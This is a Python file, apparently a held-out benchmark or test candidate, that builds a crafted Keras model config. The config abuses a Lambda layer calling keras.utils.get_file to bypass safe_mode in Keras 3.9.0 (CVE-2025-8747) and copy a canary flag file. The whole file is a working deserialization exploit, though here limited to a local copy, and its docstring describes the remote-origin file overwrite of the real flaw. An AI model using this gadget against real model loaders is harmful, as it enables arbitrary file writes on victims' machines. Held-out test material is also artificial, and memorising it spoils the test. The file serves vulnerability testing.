#!/usr/bin/env python3
"""[HELD-OUT] CVE-2025-8747 residual for deser_keras_safe_mode.

CVE-2025-1550 (keras 3.9.0) only checks whether the gadget's module BELONGS to an
approved package set {keras, keras_hub, keras_cv, keras_nlp}; it does NOT restrict
WHICH in-package callable may be reused. So an IN-ALLOWLIST keras function is still
resolvable + invokable by the same Lambda gadget primitive -- the CVE-2025-8747
bypass ("bypass the mitigation introduced in response to CVE-2025-1550 ... by
crafting malicious arguments to built-in Keras modules").

This residual reuses the internal function keras.utils.get_file:

    Lambda.function  = {"module":"keras.utils","class_name":"function","config":"get_file"}
    Lambda.arguments = {"origin":"file:///canary/flag.txt","cache_dir":"/out",
                        "cache_subdir":"","force_download":True}

get_file is reachable on V1 via the keras.* api path (get_symbol_from_name) -- it
lives in the trusted `keras` package -- so safe_mode does NOT block it. During the
one benign forward pass the Lambda calls get_file(inputs, origin=..., ...); the
tensor first arg (zeros) is falsy so get_file derives fname from origin and copies
the local file:///canary/flag.txt canary into /out (a benign local copy -- the real
CVE used a remote origin for arbitrary file OVERWRITE; here it is a harmless local
read/copy that surfaces ${PCB_FLAG}). Flag in /out == the in-allowlist gadget was
invoked == safe_mode/allowlist bypassed.

On V1 (keras 3.9.0) this REACHES the flag (residual open). On V2 (keras 3.11.0,
CVE-2025-8747 patched) _retrieve_class_or_fn raises
`Cannot deserialize keras.utils.get_file, loading functions are not allowed during
deserialization` (the LOADING_APIS denylist) at load, so it is BLOCKED."""

import json

_INPUT = {
    "module": "keras.layers", "class_name": "InputLayer",
    "config": {"batch_shape": [None, 1], "dtype": "float32", "name": "in"},
    "registered_name": None, "name": "in", "inbound_nodes": [],
}
_KT = {"class_name": "__keras_tensor__",
       "config": {"shape": [None, 1], "dtype": "float32", "keras_history": ["in", 0, 0]}}


def _get_file_config():
    fn = {"module": "keras.utils", "class_name": "function", "config": "get_file",
          "registered_name": "function"}
    args = {"origin": "file:///canary/flag.txt", "cache_dir": "/out",
            "cache_subdir": "", "force_download": True}
    lam = {"module": "keras.layers", "class_name": "Lambda",
           "config": {"name": "lam", "trainable": True, "function": fn,
                      "arguments": args, "output_shape": [1]},
           "registered_name": None, "name": "lam",
           "inbound_nodes": [{"args": [_KT], "kwargs": {}}]}
    cfg = {"module": "keras.src.models.functional", "class_name": "Functional",
           "config": {"name": "functional", "trainable": True,
                      "layers": [_INPUT, lam],
                      "input_layers": [["in", 0, 0]], "output_layers": [["lam", 0, 0]]},
           "registered_name": "Functional"}
    return json.dumps(cfg)


# One residual vector (the canonical get_file gadget). Kept as a list so the oracle
# can iterate over multiple in-allowlist gadgets if desired.
VECTORS = ["keras.utils.get_file"]


def candidate(vec="keras.utils.get_file"):
    return {
        "id": "cve-2025-8747-in-allowlist-get_file-residual",
        "config": _get_file_config(),
    }


if __name__ == "__main__":
    print(json.dumps(candidate(), indent=2))
